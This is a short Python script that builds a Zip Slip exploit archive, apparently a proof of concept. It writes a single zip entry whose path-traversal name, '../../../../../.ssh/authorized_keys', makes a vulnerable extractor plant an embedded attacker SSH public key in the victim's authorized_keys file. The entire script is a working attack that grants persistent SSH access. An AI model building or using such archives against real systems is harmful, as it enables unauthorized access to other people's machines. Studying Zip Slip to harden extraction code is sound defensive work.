import zipfile
import io

output_zip = "test.zip"
file_name = "../../../../../.ssh/authorized_keys"
file_content = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCUF39Stm0HeVKl5AFJS0NDb0XoA1ENc2bt6SbdJ22CBrSJpp64UOaEX6ygXbf7LkYstr7BG/oWo3ytPqckmA1NJYSLmpRUMbLl2AMZFhqwol8MIzzIkucE2K0g949yVVHHygYS1dvap/Ww8zG0IQlWbCF3J5rWBy7xxONzq52lNJs7qlbS0hP0AeAhYvla13jaushY0XKqEesyvY8pIXbyc5VaIO/TB5U/ssArx6KPAYQRjFHgT/XBh4INaWmPAikaJcRDCNIS9+v/IpcuCVmTyoXOkTzSIryx557CXP6lxuZuz/oenc7qWST/RQiDMYtv/VmiZ8/fnWRxSdyJ1VGRF6Ijr14Uic8tKCWPUIM9KqYTzFsBGlXzbsK9oGfGB8+5uXhDf3eUxff99W7zmUYl9IZWoJzNka+mdkGMUUVJOaIhGxMdhgVmz9CLJKd7X3fpNemoE2MIyGbSGYilop9NT/FbQfV3ulW/M8bjQjnJyiXDvCNonQI2dxjjFWz8gU= prateek@prateek-liunx\n"

# Create an in-memory text file
text_file = io.StringIO()
text_file.write(file_content)
text_file.seek(0)

# Convert the in-memory text file to bytes
data = text_file.getvalue().encode("utf-8")
text_file.close()

# Create an in-memory binary file-like object
binary_file = io.BytesIO(data)


with zipfile.ZipFile(output_zip, "w") as zipf:
    # Add the in-memory binary file-like object to the ZIP file
    zipf.writestr(file_name, binary_file.getvalue())


binary_file.close()

print(f"Created {output_zip} containing a file with name '{file_name}' and content '{file_content}'.")
